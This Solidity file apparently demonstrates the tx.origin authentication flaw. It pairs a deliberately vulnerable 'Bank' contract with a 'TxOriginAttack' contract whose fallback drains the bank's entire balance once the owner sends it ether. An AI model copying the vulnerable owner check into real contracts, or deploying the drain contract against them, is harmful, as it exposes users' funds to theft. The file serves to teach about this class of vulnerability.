// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

contract Bank {
    // address of the user who deploys this contract
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() public payable { }
 
    // draw ether if tx.origin is matched with `owner`
    function withdraw(address payable _to, uint _amount) public {
        require(tx.origin == owner);

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }   
}

contract TxOriginAttack {
    address payable public owner;
    Bank bank;

    constructor(address _bank) public payable {
        bank = Bank(_bank);
        owner = payable(msg.sender);
    }

    // this function is called when this contract receives some ether
    fallback() external payable {
        bank.withdraw(owner, address(bank).balance);
    }
}
